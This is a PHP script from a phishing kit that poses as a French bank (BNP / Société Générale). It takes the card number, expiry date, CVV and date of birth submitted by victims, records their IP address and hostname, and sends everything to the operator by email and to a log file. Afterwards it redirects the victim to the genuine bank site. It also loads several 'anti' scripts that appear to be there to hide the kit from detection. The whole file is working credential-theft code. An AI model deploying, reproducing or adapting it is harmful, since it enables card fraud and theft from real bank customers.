<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include './prevents/anti1.php';
include './prevents/anti2.php';
include './prevents/anti3.php';
include './prevents/anti4.php';
include './prevents/anti5.php';
include './prevents/anti6.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/9atila.php';
//-------- by me  --------///
//------ errore--------:::
error_reporting(E_ALL);
header('Content-type: text/html; charset-UTF-8');
date_default_timezone_set('GMT');$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));

session_start();

//------- verify-------------//
if (!isset($_POST['jj']) || $_POST['jj']==""){
	die("<script type='text/javascript'>top.location = 'index.html?error-login';</script>");
}
if (!isset($_POST['mm']) || $_POST['mm']==""){
	die("<script type='text/javascript'>top.location = 'index.html?error-pass';</script>");
}
if (!isset($_POST['aa']) || $_POST['aa']==""){
    die("<script type='text/javascript'>top.location = 'index.html?error-pass';</script>");
}
if (!isset($_POST['cv']) || $_POST['cv']==""){
    die("<script type='text/javascript'>top.location = 'index.html?error-pass';</script>");
}
if (!isset($_POST['xxx']) || $_POST['xxx']==""){
    die("<script type='text/javascript'>top.location = 'index.html?error-pass';</script>");
}

//------------variable ----------//
$jour = $_POST['jj'];
$mois = $_POST['mm'];
$anne = $_POST['aa'];
$date_ne = $jour."/".$mois."/".$anne;
$xp1 = $_POST['EMM'];
$xp2 = $_POST['EYY'];
$date_xp = $xp1."/".$xp2;
$carte = $_POST['cv'];
$chvv = $_POST['xxx'];

//echo $eml." ".$pss;



date_default_timezone_set('GMT');$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));$browserid = $_SERVER['HTTP_USER_AGENT'];$ip = getenv("REMOTE_ADDR");include 'Email.php';$VictimInfo = "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";$to = $Your_Email;$from = "bodabikola@websitefr.com";$headers = "From:" . $from;$subj = "New cv bnp by bikola : $ip";
    $data = "
+======================$subj======================+
|  Information cvv by bikola                
| Date ne  : $date_ne
| Carte 4   : $carte
| Date Exp  : $date_xp
| Cvv       : $chvv
+===================================================================+
| Information Victim                              
$VictimInfo                                       
|    powered by bikola                        
+===================================================================+";
if($Save_Log==1) { $file = fopen("../login-sg.txt","a+"); fwrite($file, $data); fclose($file);}
if($Send_Log==1) { mail($to,$subj,$data,$headers); };
/*echo $eml." / ".$pss;*/
	die("<script type='text/javascript'>top.location = 'https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html';</script>");
	



?>